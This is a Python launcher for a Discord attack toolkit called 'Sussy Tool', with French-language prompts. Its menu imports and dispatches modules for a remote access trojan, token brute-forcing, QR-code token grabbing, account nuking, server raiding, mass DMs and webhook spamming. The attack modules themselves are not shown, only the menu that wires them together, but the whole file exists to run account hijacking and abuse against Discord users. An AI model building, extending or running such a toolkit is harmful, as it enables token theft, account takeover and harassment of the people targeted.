from assets.Idtotoken.idtotoken import *
from assets.plugin.common.base import *
from assets.Rat.rat import *
from assets.Token_bruteforce.tokenbruteforce import *
from assets.Raid.raid_bot import *
from assets.Mass_dm.massdm import *
from assets.Account_Nuker.Accountnuker import *
from assets.Color_Spammer.ColorSpammer import *
from assets.qr_grabber.qr_grabber import *
from assets.Token_lookup.tokenlookup import *
from assets.DM_cleaner.dm_cleaner import *
from assets.Token_Joiner.tk_joiner import *
from assets.Webhook_spammer.WebhookSpammer import *
from assets.Webhook_deleter.webhookdeleter import *
from assets.Autologin.auto_login import *
from assets.House_Changer.HypeSquadChanger import *

def main():

    rpc("Idle")
    clear()
    sys(f"title Sussy Tool v{THIS_VERSION} - by crashixx")
    main_banner()
    print(f"""      {y}[{b}+{y}]{w} Tools list:                                        
\n          {y}[{w}01{y}]{w} Rat                {y}[{w}06{y}]{w} Account Nuker          {y}[{w}11{y}]{w} Token Joiner          {y}[{w}16{y}]{w} Selfbot (soon)
\n          {y}[{w}02{y}]{w} Token Bruteforce   {y}[{w}07{y}]{w} Color Spammer          {y}[{w}12{y}]{w} Webhook Spammer       {y}[{w}17{y}]{w} Token Generator (soon)
\n          {y}[{w}03{y}]{w} Raid bot           {y}[{w}08{y}]{w} QR grabber             {y}[{w}13{y}]{w} Webhook deleter       
\n          {y}[{w}04{y}]{w} Idtotoken          {y}[{w}09{y}]{w} DM Cleaner             {y}[{w}14{y}]{w} Auto Login         
\n          {y}[{w}05{y}]{w} Mass DM            {y}[{w}10{y}]{w} Token Lookup           {y}[{w}15{y}]{w} House Changer
\n                                                                    
""")
    choice = input(f"""{y}[{b}#{y}]{w} Choix: """)

    if choice == str(1):
        rat()
        main()
    elif choice == str(2):
        tokenbruteforce()
        main()
    elif choice == str(3):
        raid_bot()
        main()
    elif choice == str(4):
        idtotoken()
        main()
    elif choice == str(5):
        massdm()
        main()
    elif choice == str(6):
        accnuke()
        main()
    elif choice == str(7):
        cyclecolortheme()
        main()
    elif choice == str(8):
        discord_qr()
        main()
    elif choice == str(9):
        DM_deleter()
        main()
    elif choice == str(10):
        tokeninfo()
        main()
    elif choice == str(11):
        tk_joiner()
        main()
    elif choice == str(12):
        webhook_spammer()
        main()
    elif choice == str(13):
        webhook_remover()
        main()
    elif choice == str(14):
        auto_login()
        main()
    elif choice == str(15):
        hypesquadchanger()
        main()
    elif choice == str(16):
        input(f"=====\n{y}[{b}INFO{y}]{w} Selfbot - Soon..")
        main()
    elif choice == str(17):
        input(f"=====\n{y}[{b}INFO{y}]{w} Token Generator - Captcha Patched..")
        main()
    else:
        clear()
        error("Invalid Choice")
        err_banner()
        input(f"{y}[{b}INFO{y}]{w} Choix invalide :/")
        main()

if __name__ == "__main__":
    if name != "nt":
        clear()
        main_banner()
        input(f"{y}[{b}INFO{y}]{w} Ce tool n'est pas compatible avec votre système d'exploitation...")
    else:
        main()